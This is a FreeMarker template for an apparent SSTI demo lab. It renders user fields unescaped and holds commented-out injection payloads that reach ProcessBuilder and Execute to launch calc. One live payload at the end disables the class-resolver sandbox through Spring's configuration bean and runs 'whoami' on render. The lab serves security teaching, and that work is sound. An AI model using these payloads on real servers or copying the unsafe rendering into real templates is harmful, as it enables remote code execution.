<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>Freemarker SSTI Demo</title>
</head>

<body>
<table>
    <tr>
        Freemarker SSTI Demo Lab
    </tr>
    <br>
    <tr>
        Hello,
        <#if user.username??>
            ${user.username}
        <#else>
            1cfh
        </#if>
        <br><br>
        I am trying to tell you something:<br>
        <#if user.msg??>
            ${user.msg}
        <#else>
            Java SSTI
        </#if>
        <br>
        <!--payload-->
<#--        <#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProceeBuilder","calc").start()}-->
<#--        <#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc").start()}-->

<#--        <#assign classloader=archive.class.protectionDomain.classLoader>-->
<#--        <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>-->
<#--        <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>-->
<#--        <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>-->
<#--        ${dwf.newInstance(ec,null)("cmd.exe /c calc")}-->

<#--        <#assign ac=springMacroRequestContext.webApplicationContext>-->
<#--        <#assign fc=ac.getBean('freeMarkerConfiguration')>-->
<#--        <#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>-->
<#--        <#assign VOID=fc.setNewBuiltinClassResolver(dcr)>${"freemarker.template.utility.Execute"?new()("cmd.exe /c calc")}-->

        <#assign fc=Application['org.springframework.web.context.WebApplicationContext.ROOT'].getBean('freeMarkerConfiguration')>
        ${fc.setNewBuiltinClassResolver(fc.getDefaultConfiguration().getNewBuiltinClassResolver())}
        ${"freemarker.template.utility.Execute"?new()("whoami")}
    </tr>


</table>
</body>
</html>